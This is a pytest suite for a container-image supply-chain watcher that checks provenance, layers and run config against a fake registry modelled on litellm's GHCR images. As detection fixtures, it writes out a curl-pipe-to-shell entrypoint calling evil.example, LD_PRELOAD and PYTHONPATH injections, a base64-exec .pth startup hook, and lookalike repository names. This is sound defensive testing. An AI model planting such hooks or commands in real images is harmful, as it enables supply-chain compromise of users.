"""Image watch: a container image judged by its BuildKit provenance against what its repository is known to be built
from and by, against a fake registry. No network. The provenance shapes follow the real litellm images on GHCR:
`vcs:source` names the repository built from, `github_repository` and `github_workflow_ref` the workflow that built it,
and one repository holds images from a release workflow, a nightly workflow and branch builds."""

from __future__ import annotations

import hashlib
import json

import pytest

from diff_sentry.config import DetectConfig
from diff_sentry.images import (
    ImageWatcher,
    Registry,
    image_provenance,
    parse_image,
    provenance_facts,
    scan_image,
)

_RELEASE = {"source": "https://github.com/BerriAI/litellm", "builder": "BerriAI/project-releaser",
            "workflow": "BerriAI/project-releaser/.github/workflows/stage.yml@refs/heads/main", "protected": "true"}
_NIGHTLY = {**_RELEASE, "workflow": "BerriAI/project-releaser/.github/workflows/docker-publish.yml@refs/heads/main",
            "protected": "false"}
_BRANCH = {**_RELEASE, "builder": "BerriAI/litellm", "workflow": "BerriAI/litellm/.github/workflows/ghcr_deploy.yml@refs/heads/x",
           "protected": "false"}
_ATTACK = {**_RELEASE, "source": "https://github.com/Berri-AI/litellm", "protected": "false"}
_CONFIG = {"Entrypoint": ["docker/prod_entrypoint.sh"], "Cmd": ["--port", "4000"], "User": "nobody",
           "WorkingDir": "/app", "Env": ["PATH=/app/.venv/bin:/usr/bin", "LITELLM_VERSION=1"]}


def _provenance(source: str, builder: str, workflow: str, protected: str = "true", subject: str = "") -> dict:
    return {"_type": "https://in-toto.io/Statement/v0.1", "predicateType": "https://slsa.dev/provenance/v1",
            "subject": [{"name": "x", "digest": {"sha256": subject}}] if subject else [],
            "predicate": {
                "buildDefinition": {"internalParameters": {
                    "github_repository": builder, "github_workflow_ref": workflow, "github_ref": "refs/heads/main",
                    "github_ref_protected": protected, "github_event_name": "workflow_dispatch"}},
                "runDetails": {"metadata": {"buildkit_metadata": {"vcs": {"source": source, "revision": "abc123"}}}}}}


class _Registry:
    """A fake registry: each pushed tag an OCI index of platform images, each with its attestation manifest naming it; a 401 with a Bearer challenge until a token is asked for, and again once `expire()` is called."""

    def __init__(self):
        self.blobs: dict[str, bytes] = {}
        self.manifests: dict[str, bytes] = {}
        self.tags: dict[str, str] = {}
        self.calls: list[tuple[str, str]] = []
        self.token = "t1"
        self.pushes = 0

    def _put(self, store: dict, data: dict | bytes) -> str:
        raw = data if isinstance(data, bytes) else json.dumps(data).encode()
        digest = "sha256:" + hashlib.sha256(raw).hexdigest()
        store[digest] = raw
        return digest

    def platform(self, provenance: dict | None, arch: str = "amd64", layers: tuple[bytes, ...] = (),
                 config: dict | None = None) -> tuple[dict, dict | None]:
        """A platform image (its layers, gzipped tars, and its config, stored as blobs) and its attestation descriptor (None without provenance)."""
        self.pushes += 1
        descs = [{"mediaType": "application/vnd.oci.image.layer.v1.tar+gzip", "digest": self._put(self.blobs, layer),
                  "size": len(layer)} for layer in layers]
        blob = json.dumps({"architecture": arch, "config": config or _CONFIG}).encode()
        cfg = {"mediaType": "application/vnd.oci.image.config.v1+json", "digest": self._put(self.blobs, blob), "size": len(blob)}
        image = self._put(self.manifests, {"mediaType": "application/vnd.oci.image.manifest.v1+json", "config": cfg,
                                           "layers": descs, "n": self.pushes})
        desc = {"mediaType": "application/vnd.oci.image.manifest.v1+json", "digest": image,
                "platform": {"os": "linux", "architecture": arch}}
        if provenance is None:
            return desc, None
        statement = _provenance(**provenance, subject=image.split(":", 1)[1])
        blob = self._put(self.blobs, statement)
        att = self._put(self.manifests, {"mediaType": "application/vnd.oci.image.manifest.v1+json", "layers": [
            {"mediaType": "application/vnd.in-toto+json", "digest": blob,
             "annotations": {"in-toto.io/predicate-type": "https://slsa.dev/provenance/v1"}}]})
        return desc, {"mediaType": "application/vnd.oci.image.manifest.v1+json", "digest": att,
                      "annotations": {"vnd.docker.reference.type": "attestation-manifest",
                                      "vnd.docker.reference.digest": image},
                      "platform": {"os": "unknown", "architecture": "unknown"}}

    def push(self, tag: str, *provenances: dict | None, entries: list[dict] | None = None,
             layers: tuple[bytes, ...] = (), config: dict | None = None) -> str:
        if entries is None:
            entries = []
            for i, prov in enumerate(provenances or (_RELEASE,)):
                desc, att = self.platform(prov, ("amd64", "arm64", "s390x", "ppc64le")[i % 4], layers, config)
                entries += [desc] + ([att] if att else [])
        index = self._put(self.manifests, {"mediaType": "application/vnd.oci.image.index.v1+json", "manifests": entries})
        self.tags[tag] = index
        return index

    def expire(self) -> None:
        self.token = f"t{int(self.token[1:]) + 1}"

    def __call__(self, url: str, headers: dict, limit: int):
        method = headers.get("X-Method", "GET")
        self.calls.append((method, url))
        if url.startswith("https://ghcr.io/token"):
            return 200, {}, json.dumps({"token": self.token}).encode()
        if headers.get("Authorization") != f"Bearer {self.token}":
            return 401, {"WWW-Authenticate": 'Bearer realm="https://ghcr.io/token",service="ghcr.io",scope="x"'}, b""
        path = url.split("/v2/", 1)[1].split("/", 2)[2]
        if path.startswith("tags/list"):
            return 200, {}, json.dumps({"tags": sorted(self.tags)}).encode()
        if path.startswith("manifests/"):
            ref = path.split("/", 1)[1]
            digest = self.tags.get(ref, ref)
            if digest not in self.manifests:
                return 404, {}, b""
            return 200, {"Docker-Content-Digest": digest}, b"" if method == "HEAD" else self.manifests[digest]
        if path.startswith("blobs/"):
            digest = path.split("/", 1)[1]
            return (200, {}, self.blobs[digest]) if digest in self.blobs else (404, {}, b"")
        return 404, {}, b""


def _watcher(tmp_path, reg, floating=("latest",), **kw) -> ImageWatcher:
    return ImageWatcher(["ghcr.io/berriai/litellm"], state_dir=str(tmp_path / "s"), out_dir=str(tmp_path / "o"),
                        floating=floating, fetch=reg, emit=kw.pop("emit", False), **kw)


def _strong(results: list[dict]) -> dict[str, set[str]]:
    return {r["tag"]: {rule for rule, sev, _ in r.get("indicators", []) if sev in ("high", "critical")} for r in results}


def _seed(reg: _Registry) -> None:
    """A repository holding release, nightly and branch builds, as litellm's does."""
    reg.push("v1.106.1", _RELEASE)
    reg.push("v1.106.2", _RELEASE)
    reg.tags["latest"] = reg.tags["v1.106.2"]
    reg.push("v1.106.2-nightly", _NIGHTLY)
    reg.push("router-dev", _BRANCH)


def test_image_names():
    assert parse_image("ghcr.io/BerriAI/litellm").label == "ghcr.io/berriai/litellm"
    assert parse_image("litellm/litellm").registry == "registry-1.docker.io"
    assert parse_image("python").name == "library/python"
    with pytest.raises(ValueError):
        parse_image("evil.example/x/y")


@pytest.mark.parametrize(("url", "repo"), [
    ("https://github.com/BerriAI/litellm", "berriai/litellm"),
    ("https://github.com/BerriAI/litellm.git", "berriai/litellm"),
    ("git@github.com:BerriAI/litellm.git", "berriai/litellm"),
    ("https://evilgithub.com/BerriAI/litellm", "https://evilgithub.com/berriai/litellm"),     # not GitHub's host
    ("https://attacker.tld/github.com/BerriAI/litellm", "https://attacker.tld/github.com/berriai/litellm"),
])
def test_only_github_com_names_a_github_repository(url, repo):
    assert provenance_facts(_provenance(url, "a/b", "a/b/.github/workflows/x.yml"))["source"] == repo


def test_the_litellm_1_107_0_image_is_critical(tmp_path):
    reg = _Registry()
    _seed(reg)
    w = _watcher(tmp_path, reg, floating=("latest", "main-stable"))
    try:
        assert w.poll_once() == []                                   # first sight: the baseline
        reg.push("v1.107.0", _ATTACK)
        reg.tags["latest"] = reg.tags["main-stable"] = reg.tags["v1.107.0"]
        results = w.poll_once()
        assert {r["tag"] for r in results} == {"v1.107.0", "latest", "main-stable"}
        assert all("image-source-lookalike" in rules for rules in _strong(results).values())
        assert w.poll_once() == []                                   # judged once
        reg.push("v1.107.1", _ATTACK)                                # an alerting image never becomes what is known
        assert "image-source-lookalike" in _strong(w.poll_once())["v1.107.1"]
    finally:
        w.close()


def test_release_nightly_and_branch_builds_interleaved_raise_nothing_at_the_floor(tmp_path):
    reg = _Registry()
    _seed(reg)
    w = _watcher(tmp_path, reg)
    try:
        w.poll_once()
        for tag, prov in (("v1.107.0-nightly", _NIGHTLY), ("v1.107.0", _RELEASE), ("other-dev", _BRANCH), ("v1.107.1", _RELEASE)):
            reg.push(tag, prov)
            assert not any(_strong(w.poll_once()).values()), tag
    finally:
        w.close()


def test_what_a_changed_provenance_is_worth():
    known = {"sources": ["berriai/litellm"], "builders": ["berriai/project-releaser berriai/project-releaser/.github/workflows/stage.yml"],
             "protected": ["berriai/project-releaser/.github/workflows/stage.yml"]}

    def rules(change: dict) -> dict[str, str]:
        facts = {"image": "x", "tag": "t", "index": True, "known": known,
                 "provenance": [provenance_facts(_provenance(**{**_RELEASE, **change}))]}
        return {h.rule: h.severity for h in scan_image(facts)}

    assert rules({"source": "https://github.com/someone/litellm"}) == {"image-source-changed": "high"}
    assert rules({"source": "https://github.com/BerriAI/litellm-fork"}) == {"image-source-changed": "medium"}
    assert rules({"workflow": "BerriAI/project-releaser/.github/workflows/new.yml@refs/heads/main"}) == {"image-workflow-changed": "medium"}
    assert rules({"builder": "someone/releaser", "workflow": "someone/releaser/.github/workflows/x.yml@refs/heads/main"}) == {
        "image-builder-changed": "high"}
    assert rules({"builder": "Berri-AI/project-releaser", "workflow": "Berri-AI/project-releaser/.github/workflows/stage.yml@x"}) == {
        "image-builder-lookalike": "critical"}
    assert rules({"protected": "false"}) == {"image-ref-unprotected": "high"}


def test_cosign_tags_are_not_images(tmp_path):
    reg = _Registry()
    _seed(reg)
    w = _watcher(tmp_path, reg)
    try:
        w.poll_once()
        digest = reg.tags["v1.106.2"].split(":", 1)[1]
        for suffix in ("sig", "att", "sbom"):
            reg.tags[f"sha256-{digest}.{suffix}"] = reg.push("tmp", entries=[])
        reg.tags.pop("tmp")
        assert w.poll_once() == []
    finally:
        w.close()


def test_an_index_without_provenance_or_with_an_unattested_platform_is_high(tmp_path):
    reg = _Registry()
    _seed(reg)
    w = _watcher(tmp_path, reg)
    try:
        w.poll_once()
        reg.push("v1.107.0", None)
        reg.push("v1.107.1", _RELEASE, None)                          # amd64 attested, the other platform not
        strong = _strong(w.poll_once())
        assert "image-provenance-dropped" in strong["v1.107.0"]
        assert "release-not-fully-read" in strong["v1.107.1"]
    finally:
        w.close()


def test_an_attestation_borrowed_from_another_image_is_not_read_as_this_ones(tmp_path):
    reg = _Registry()
    _seed(reg)
    w = _watcher(tmp_path, reg)
    try:
        w.poll_once()
        old = json.loads(reg.manifests[reg.tags["v1.106.2"]])["manifests"]
        attestation = next(m for m in old if "annotations" in m)
        payload, _ = reg.platform(_ATTACK)                             # a new image, paired with the old attestation
        reg.push("v1.107.0", entries=[payload, attestation])
        assert "release-not-fully-read" in _strong(w.poll_once())["v1.107.0"]
    finally:
        w.close()


def test_a_re_pushed_version_tag_is_judged_again(tmp_path):
    reg = _Registry()
    _seed(reg)
    w = _watcher(tmp_path, reg)
    try:
        w.poll_once()
        reg.push("v1.106.2", _ATTACK)
        assert "image-source-lookalike" in _strong(w.poll_once())["v1.106.2"]
    finally:
        w.close()


def test_an_expired_token_is_asked_for_again(tmp_path):
    reg = _Registry()
    _seed(reg)
    w = _watcher(tmp_path, reg)
    try:
        w.poll_once()
        reg.expire()
        reg.push("v1.107.0", _RELEASE)
        assert [r["tag"] for r in w.poll_once()] == ["v1.107.0"]
    finally:
        w.close()


def test_digests_are_rechecked_with_head_requests(tmp_path):
    reg = _Registry()
    _seed(reg)
    w = _watcher(tmp_path, reg)
    try:
        w.poll_once()
        reg.calls.clear()
        w.poll_once()
        manifests = [(m, u) for m, u in reg.calls if "/manifests/" in u]
        assert manifests and all(m == "HEAD" for m, _ in manifests)
    finally:
        w.close()


def test_a_registry_that_wants_real_credentials_or_another_host_is_refused():
    def challenge(url, headers, limit):
        return 401, {"WWW-Authenticate": 'Bearer realm="https://evil.example/token",service="x"'}, b""

    with pytest.raises(ValueError):
        Registry(challenge).tags(parse_image("ghcr.io/a/b"))
    from diff_sentry.images import _httpx_fetch

    with pytest.raises(ValueError):
        _httpx_fetch()("https://evil.example/v2/a/b/tags/list", {}, 10)


def test_tokens_are_kept_per_registry():
    reg = _Registry()
    _seed(reg)
    registry = Registry(reg)
    registry.tags(parse_image("ghcr.io/berriai/litellm"))
    assert ("ghcr.io", "berriai/litellm") in registry.tokens
    assert ("registry-1.docker.io", "berriai/litellm") not in registry.tokens


def test_a_comparison_given_up_still_alerts_and_a_refused_alert_is_sent_again(tmp_path):
    reg = _Registry()
    _seed(reg)
    answers = [503, 202]
    sent = []
    config = DetectConfig(main_model="x", sub_model="x", siem_webhook_url="https://siem.invalid/h")
    w = _watcher(tmp_path, reg, emit=True, config=config, poster=lambda u, h, p: sent.append(p) or (answers.pop(0) if answers else 202))
    try:
        w.poll_once()
        index = reg.push("v1.107.0", _RELEASE)
        reg.manifests.pop(index)
        for _ in range(6):
            w.poll_once()
        assert [p["run_id"].endswith("unknown") for p in sent] == [True, True]       # refused once, then accepted
        assert any(i["rule"] == "release-not-fully-read" for i in sent[0]["indicators"])
        assert w.poll_once() == []
    finally:
        w.close()


def test_image_provenance_reads_every_platform():
    reg = _Registry()
    reg.push("v1", _RELEASE, _RELEASE)
    digest, facts, notes, index = image_provenance(Registry(reg), parse_image("ghcr.io/berriai/litellm"), "v1")
    assert digest.startswith("sha256:") and len(facts) == 2 and not notes and index


def test_the_module_stays_dspy_free():
    import subprocess
    import sys

    code = "import sys, diff_sentry.images; assert 'dspy' not in sys.modules; print('ok')"
    out = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True)
    assert out.returncode == 0 and out.stdout.strip() == "ok", out.stderr


def test_a_single_manifest_where_the_repository_carries_provenance_is_high(tmp_path):
    reg = _Registry()
    _seed(reg)
    w = _watcher(tmp_path, reg)
    try:
        w.poll_once()
        plain = reg._put(reg.manifests, {"mediaType": "application/vnd.oci.image.manifest.v1+json", "layers": [], "n": "x"})
        reg.tags["v1.107.0"] = reg.tags["latest"] = plain
        strong = _strong(w.poll_once())
        assert "image-provenance-dropped" in strong["v1.107.0"] and "image-provenance-dropped" in strong["latest"]
    finally:
        w.close()


def test_a_lookalike_in_the_first_sight_sample_is_never_learned(tmp_path):
    reg = _Registry()
    _seed(reg)
    reg.push("v1.106.3", _ATTACK)
    reg.tags["latest"] = reg.tags["v1.106.3"]                       # already bad when the watch starts
    w = _watcher(tmp_path, reg)
    try:
        w.poll_once()
        known = json.loads(w.db.execute("SELECT known FROM images").fetchone()["known"])
        assert "berri-ai/litellm" not in known["sources"]
        reg.push("v1.107.1", _ATTACK)
        assert "image-source-lookalike" in _strong(w.poll_once())["v1.107.1"]
    finally:
        w.close()


def test_a_first_sight_sample_without_provenance_still_judges_against_the_ghcr_namespace(tmp_path):
    reg = _Registry()
    reg.push("v1.0.0", None)
    w = _watcher(tmp_path, reg)
    try:
        w.poll_once()
        reg.push("v1.0.1", _ATTACK)
        assert "image-source-lookalike" in _strong(w.poll_once())["v1.0.1"]
    finally:
        w.close()


def test_an_unreadable_first_sight_sample_is_no_baseline(tmp_path):
    reg = _Registry()
    _seed(reg)
    for digest in list(reg.blobs):
        reg.blobs.pop(digest)
    w = _watcher(tmp_path, reg)
    try:
        w.poll_once()
        assert w.db.execute("SELECT COUNT(*) FROM images").fetchone()[0] == 0
    finally:
        w.close()


def test_an_attestation_without_a_subject_is_not_bound_to_the_image():
    reg = _Registry()
    reg.push("v1", _RELEASE)
    for digest, raw in list(reg.blobs.items()):
        reg.blobs[digest] = json.dumps({**json.loads(raw), "subject": []}).encode()
    _, facts, notes, _ = image_provenance(Registry(reg), parse_image("ghcr.io/berriai/litellm"), "v1")
    assert not facts and notes


def test_new_tags_are_judged_newest_first_by_version_numbers():
    from diff_sentry.images import _version_key

    tags = ["v1.83.9-nightly", "v1.106.2", "v1.83.7-stable.patch.1", "v1.106.2-nightly", "latest"]
    assert sorted(tags, key=_version_key)[-2:] == ["v1.106.2-nightly", "v1.106.2"]


def test_a_rate_limit_is_no_failure(tmp_path):
    reg = _Registry()
    _seed(reg)
    w = _watcher(tmp_path, reg)
    try:
        w.poll_once()
        reg.push("v1.107.0", _RELEASE)
        real = reg.__call__

        def limited(url, headers, limit):
            return (429, {}, b"") if "/manifests/" in url else real(url, headers, limit)

        w.registry.fetch = limited
        assert [r for r in w.poll_once() if "error" in r] == []
        assert w.db.execute("SELECT COUNT(*) FROM image_judgments").fetchone()[0] == 0
        w.registry.fetch = reg
        assert [r["tag"] for r in w.poll_once()] == ["v1.107.0"]
    finally:
        w.close()


def _hub_watcher(tmp_path, reg) -> ImageWatcher:
    """The fake registry read as a Docker Hub image: no GHCR namespace stands for a GitHub owner."""
    w = ImageWatcher(["docker.io/litellm/litellm"], state_dir=str(tmp_path / "h"), out_dir=str(tmp_path / "o"),
                     floating=("latest",), fetch=lambda url, headers, limit: reg(url.replace("registry-1.docker.io", "ghcr.io"), headers, limit),
                     emit=False)
    return w


def test_docker_hub_an_image_built_outside_github_actions_is_high(tmp_path):
    reg = _Registry()
    _seed(reg)
    w = _hub_watcher(tmp_path, reg)
    try:
        w.poll_once()
        reg.push("v1.107.0", {**_RELEASE, "builder": "", "workflow": ""})
        assert "image-builder-changed" in _strong(w.poll_once())["v1.107.0"]
    finally:
        w.close()


def test_docker_hub_a_lookalike_at_first_sight_alerts_and_both_owners_stay_unresolved(tmp_path):
    reg = _Registry()
    _seed(reg)
    reg.push("v1.107.0", _ATTACK)
    reg.tags["latest"] = reg.tags["v1.107.0"]
    sent = []
    config = DetectConfig(main_model="x", sub_model="x", siem_webhook_url="https://siem.invalid/h")
    w = ImageWatcher(["docker.io/litellm/litellm"], state_dir=str(tmp_path / "h"), out_dir=str(tmp_path / "o"),
                     floating=("latest",), fetch=lambda url, headers, limit: reg(url.replace("registry-1.docker.io", "ghcr.io"), headers, limit),
                     config=config, poster=lambda u, h, p: sent.append(p) or 202)
    try:
        w.poll_once()
        assert any(i["rule"] == "image-source-lookalike" for p in sent for i in p["indicators"])
        reg.push("v1.107.1", _ATTACK)
        reg.push("v1.107.2", _RELEASE)
        reg.push("v1.108.0", {**_RELEASE, "source": "https://github.com/BerriA-I/litellm"})      # a third lookalike
        reg.push("v1.108.1", {**_RELEASE, "source": "https://github.com/someone/else"})
        reg.tags["v1.108.2"] = reg._put(reg.manifests, {"mediaType": "application/vnd.oci.image.manifest.v1+json", "layers": [], "n": "y"})
        reg.push("v1.108.3", None)                                   # an index with no attestation
        strong = _strong(w.poll_once())
        assert all("image-owner-unresolved" in strong[t] for t in ("v1.107.1", "v1.107.2", "v1.108.0", "v1.108.1", "v1.108.2", "v1.108.3"))
        assert "image-source-lookalike" in strong["v1.108.0"]
        known = json.loads(w.db.execute("SELECT known FROM images").fetchone()["known"])
        assert not known["sources"]                                  # nothing learned while unresolved
    finally:
        w.close()


def test_the_recheck_window_holds_plain_releases_not_one_versions_prereleases(tmp_path):
    from diff_sentry.images import _releases

    tags = ["v1.106.2", "1.106.2", "v1.106.1"] + [f"{p}1.107.0-{s}" for p in ("", "v") for s in ("dev.1", "dev.2", "rc.1", "rc.2")]
    assert _releases(tags)[-2:] == ["1.106.2", "v1.106.2"] and not any("-" in t for t in _releases(tags))


def test_the_first_sight_alert_is_sent_once_and_again_when_refused(tmp_path):
    reg = _Registry()
    _seed(reg)
    reg.push("v1.107.0", _ATTACK)
    reg.tags["latest"] = reg.tags["v1.107.0"]
    answers = [503, 202]
    sent = []
    config = DetectConfig(main_model="x", sub_model="x", siem_webhook_url="https://siem.invalid/h")
    w = _watcher(tmp_path, reg, emit=True, config=config,
                 poster=lambda u, h, p: sent.append(p) or (answers.pop(0) if answers else 202))
    try:
        for _ in range(3):
            w.poll_once()
        first = [p for p in sent if p["source"]["title"].endswith("(first sight)")]
        assert len(first) == 2                                       # refused, then sent again; never a new alert
    finally:
        w.close()


# ── layers by content ────────────────────────────────────────────────────────────────────────────────────

def _layer(files: dict[str, str | bytes], compress: bool = True) -> bytes:
    import gzip
    import io
    import tarfile

    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        for path, text in files.items():
            data = text if isinstance(text, bytes) else text.encode()
            info = tarfile.TarInfo(path)
            info.size = len(data)
            info.mtime = 0
            tf.addfile(info, io.BytesIO(data))
    return gzip.compress(buf.getvalue(), mtime=0) if compress else buf.getvalue()


_BASE = _layer({"usr/bin/python3": b"\x7fELF...", "etc/os-release": "ID=debian\n"})
_SITE = "usr/local/lib/python3.13/site-packages/"


def _app(version: str, extra: dict | None = None) -> bytes:
    return _layer({f"{_SITE}litellm/__init__.py": f"__version__ = '{version}'\n",
                   f"{_SITE}litellm/proxy.py": "def serve():\n    return 1\n", **(extra or {})})


def _layered(tmp_path, new_layers: tuple[bytes, ...], old_layers: tuple[bytes, ...] | None = None, tag: str = "v1.107.0"):
    reg = _Registry()
    reg.push("v1.106.2", _RELEASE, layers=old_layers or (_BASE, _app("1.106.2")))
    reg.tags["latest"] = reg.tags["v1.106.2"]
    w = _watcher(tmp_path, reg)
    w.poll_once()
    reg.push(tag, _RELEASE, layers=new_layers)
    return reg, w


def test_a_payload_in_a_changed_layer_is_screened(tmp_path):
    payload = {f"{_SITE}litellm_init.pth": "import os, base64; exec(base64.b64decode('cHJpbnQoMSk='))\n"}
    reg, w = _layered(tmp_path, (_BASE, _app("1.107.0", payload)))
    try:
        results = w.poll_once()
        strong = _strong(results)["v1.107.0"]
        assert "python-startup-hook" in strong
        assert results[0]["signal"]
        blobs = [u for m, u in reg.calls if "/blobs/" in u]
        assert not any(_BASE_DIGEST in u for u in blobs)           # the shared base layer is never downloaded
    finally:
        w.close()


_BASE_DIGEST = "sha256:" + __import__("hashlib").sha256(_BASE).hexdigest()


def test_a_rebuilt_layer_shows_only_what_changed(tmp_path):
    _, w = _layered(tmp_path, (_BASE, _app("1.107.0")))
    try:
        results = w.poll_once()
        assert not results[0]["signal"] and not _strong(results)["v1.107.0"]
    finally:
        w.close()


def test_a_whiteout_removes_what_is_beneath_it(tmp_path):
    old = (_BASE, _app("1.106.2", {f"{_SITE}old.pth": "import sys\n"}))
    new = (_BASE, _app("1.107.0", {f"{_SITE}old.pth": "import sys\n"}), _layer({f"{_SITE}.wh.old.pth": ""}))
    _, w = _layered(tmp_path, new, old)
    try:
        assert not _strong(w.poll_once())["v1.107.0"]
    finally:
        w.close()


@pytest.mark.parametrize("bad", ["digest", "zstd", "size", "platform"])
def test_a_layer_that_cannot_be_read_alerts(tmp_path, bad, monkeypatch):
    from diff_sentry import images

    reg = _Registry()
    reg.push("v1.106.2", _RELEASE, layers=(_BASE, _app("1.106.2")))
    w = _watcher(tmp_path, reg)
    try:
        w.poll_once()
        app = _app("1.107.0")
        if bad == "zstd":
            app = b"\x28\xb5\x2f\xfd" + app[4:]
        if bad == "size":
            monkeypatch.setattr(images, "_MAX_LAYER_BYTES", 10)
        index = reg.push("v1.107.0", _RELEASE, layers=(_BASE, app))
        if bad == "digest":
            digest = "sha256:" + __import__("hashlib").sha256(app).hexdigest()
            reg.blobs[digest] = app + b"tampered"
        if bad == "platform":
            index = reg.push("v1.107.0", _RELEASE, _RELEASE, layers=(_BASE, app))     # an arm64 image the previous lacked
        assert index
        assert "release-not-fully-read" in _strong(w.poll_once())["v1.107.0"]
    finally:
        w.close()


def test_a_floating_tag_is_compared_with_the_image_it_pointed_at(tmp_path):
    reg = _Registry()
    reg.push("v1.106.2", _RELEASE, layers=(_BASE, _app("1.106.2")))
    reg.tags["latest"] = reg.tags["v1.106.2"]
    w = _watcher(tmp_path, reg)
    try:
        w.poll_once()
        reg.push("moved", _RELEASE, layers=(_BASE, _app("1.106.2", {f"{_SITE}x.pth": "import os;os.system('id')\n"})))
        reg.tags["latest"] = reg.tags.pop("moved")
        strong = _strong(w.poll_once())
        assert "python-startup-hook" in strong["latest"]
    finally:
        w.close()


def _pyc(source: str, path: str, header: bytes = b"\0" * 12, magic: bytes | None = None) -> bytes:
    """A real `.pyc` of this interpreter: its magic, a 12-byte header, and the source compiled (never run)."""
    import importlib.util
    import marshal

    return (magic or importlib.util.MAGIC_NUMBER) + header + marshal.dumps(compile(source, "/" + path, "exec", dont_inherit=True))


_PROXY = f"{_SITE}litellm/proxy.py"
_PROXY_PYC = f"{_SITE}litellm/__pycache__/proxy.cpython-313.pyc"


def _bytecode_case(tmp_path, source: str, pyc: bytes) -> set[str]:
    old = (_BASE, _app("1.106.2", {_PROXY_PYC: _pyc("def serve():\n    return 1\n", _PROXY)}))
    _, w = _layered(tmp_path, (_BASE, _app("1.107.0", {_PROXY: source, _PROXY_PYC: pyc})), old)
    try:
        return _strong(w.poll_once())["v1.107.0"]
    finally:
        w.close()


def test_bytecode_that_is_its_source_compiled_is_not_unread_code(tmp_path):
    new = "def serve():\n    return 2\n"
    assert "release-code-not-read" not in _bytecode_case(tmp_path, new, _pyc(new, _PROXY))
    # only the header moved (a rebuild's source mtime): not a change at all
    old = "def serve():\n    return 1\n"
    assert "release-code-not-read" not in _bytecode_case(tmp_path / "h", old, _pyc(old, _PROXY, header=b"\1" * 12))


def test_bytecode_that_is_not_its_source_alerts(tmp_path):
    # a harmless edit to the source, and bytecode compiled from something else beside it
    swapped = _pyc("import os\nos.system('id')\n", _PROXY)
    assert "release-code-not-read" in _bytecode_case(tmp_path, "def serve():\n    return 2  # tidy\n", swapped)


def test_bytecode_no_interpreter_here_can_check_alerts(tmp_path):
    new = "def serve():\n    return 2\n"
    assert "release-code-not-read" in _bytecode_case(tmp_path, new, _pyc(new, _PROXY, magic=b"\x01\x00\r\n"))


_PAYLOAD_PTH = {f"{_SITE}litellm_init.pth": "import os, base64; exec(base64.b64decode('cHJpbnQoMSk='))\n"}


def test_an_opaque_whiteout_after_the_payload_in_its_own_layer_hides_nothing(tmp_path):
    extra = _layer({**_PAYLOAD_PTH, f"{_SITE}.wh..wh..opq": ""})
    _, w = _layered(tmp_path, (_BASE, _app("1.107.0"), extra))
    try:
        assert "python-startup-hook" in _strong(w.poll_once())["v1.107.0"]
    finally:
        w.close()


def test_two_images_for_one_platform_compare_the_first_and_alert(tmp_path):
    reg = _Registry()
    reg.push("v1.106.2", _RELEASE, layers=(_BASE, _app("1.106.2")))
    w = _watcher(tmp_path, reg)
    try:
        w.poll_once()
        bad, bad_att = reg.platform(_RELEASE, "amd64", (_BASE, _app("1.107.0", _PAYLOAD_PTH)))
        good, good_att = reg.platform(_RELEASE, "amd64", (_BASE, _app("1.107.0")))
        reg.push("v1.107.0", entries=[bad, good, bad_att, good_att])
        strong = _strong(w.poll_once())["v1.107.0"]
        assert {"python-startup-hook", "release-not-fully-read"} <= strong
    finally:
        w.close()


def test_attestation_entries_do_not_crowd_out_the_platform_images(tmp_path):
    reg = _Registry()
    reg.push("v1.106.2", _RELEASE, layers=(_BASE, _app("1.106.2")))
    w = _watcher(tmp_path, reg)
    try:
        w.poll_once()
        image, att = reg.platform(_RELEASE, "amd64", (_BASE, _app("1.107.0", _PAYLOAD_PTH)))
        reg.push("v1.107.0", entries=[att] * 32 + [image])
        assert "python-startup-hook" in _strong(w.poll_once())["v1.107.0"]
    finally:
        w.close()


def test_a_repository_without_release_tags_compares_with_its_floating_tag(tmp_path):
    reg = _Registry()
    reg.push("sha-aaa", _RELEASE, layers=(_BASE, _app("1")))
    reg.tags["latest"] = reg.tags["sha-aaa"]
    w = _watcher(tmp_path, reg)
    try:
        w.poll_once()
        reg.push("sha-bbb", _RELEASE, layers=(_BASE, _app("2", _PAYLOAD_PTH)))      # latest left where it was
        assert "python-startup-hook" in _strong(w.poll_once())["sha-bbb"]
    finally:
        w.close()


def test_a_large_member_is_hashed_without_being_held():
    import gzip
    import io
    import tarfile

    from diff_sentry import releases

    size = 3 << 20
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tf:
        info = tarfile.TarInfo("app/big.py")
        info.size = size
        tf.addfile(info, io.BytesIO(b"\0" * size))
    art = releases.Artifact("layer", "linux-amd64")
    releases._read_tar(art, gzip.compress(buf.getvalue()), releases._Budget(), path_of=lambda p: p)
    member = art.members["app/big.py"]
    assert member.text is None and member.unread == "larger than 1 MiB" and member.size == size and member.blobs



@pytest.mark.parametrize(("change", "rule"), [
    ({"Entrypoint": ["sh", "-c", "curl -s https://evil.example/x | sh; exec docker/prod_entrypoint.sh"]}, "image-run-config-changed"),
    ({"Env": [*_CONFIG["Env"], "LD_PRELOAD=/tmp/x.so"]}, "image-loader-env"),
    ({"Env": ["PATH=/app/.venv/bin:/usr/bin", "LITELLM_VERSION=1", "PYTHONPATH=/tmp/x"]}, "image-loader-env"),
    ({"Env": [*_CONFIG["Env"], "PYTHONWARNINGS=ignore::litellm_init.Warn"]}, "image-loader-env"),
    ({"Env": [*_CONFIG["Env"], "LD_PROFILE=libc.so.6"]}, "image-loader-env"),
])
def test_a_config_change_over_the_same_layers_alerts(tmp_path, change, rule):
    reg = _Registry()
    reg.push("v1.106.2", _RELEASE, layers=(_BASE, _app("1.106.2")))
    w = _watcher(tmp_path, reg)
    try:
        w.poll_once()
        reg.push("v1.107.0", _RELEASE, layers=(_BASE, _app("1.106.2")), config={**_CONFIG, **change})   # every layer reused
        assert rule in _strong(w.poll_once())["v1.107.0"]
    finally:
        w.close()


def test_a_routine_config_change_is_only_screened(tmp_path):
    reg = _Registry()
    reg.push("v1.106.2", _RELEASE, layers=(_BASE, _app("1.106.2")))
    w = _watcher(tmp_path, reg)
    try:
        w.poll_once()
        reg.push("v1.107.0", _RELEASE, layers=(_BASE, _app("1.107.0")), config={**_CONFIG, "Env": ["PATH=/app/.venv/bin:/usr/bin", "LITELLM_VERSION=2"]})
        result = w.poll_once()[0]
        assert not result["signal"]
    finally:
        w.close()
